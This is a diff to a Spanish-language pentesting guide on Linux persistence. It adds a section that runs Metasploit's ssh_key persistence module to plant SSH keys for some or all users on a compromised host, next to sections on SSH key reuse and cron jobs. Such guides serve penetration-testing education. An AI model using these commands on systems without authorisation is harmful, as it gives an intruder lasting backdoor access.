@@ -95,6 +95,18 @@ Para iniciar sesión con la clave que hemos obtenido usamos la opción `-i`.
 usr@hostname:~# ssh -i key usr@ip
 ```
 
+**Con metasploit:**
+
+En este caso no copia las claves existentes, sino que las crea para los usuarios indicados, para todos si no se indica ninguno.
+
+```bash
+msf > use exploit/multi/persistence/ssh_key
+[*] Using configured payload payload/generic/custom
+msf exploit(multi/persistence/ssh_key) > set createsshfolder true
+msf exploit(multi/persistence/ssh_key) > set session id
+msf exploit(multi/persistence/ssh_key) > exploit
+```
+
 ### Vía Cron Jobs
 
 Linux implementa la programación de tareas mediante Cron, un servicio basado en el tiempo que ejecuta aplicaciones, scripts y otros comandos de forma repetitiva siguiendo una programación determinada.
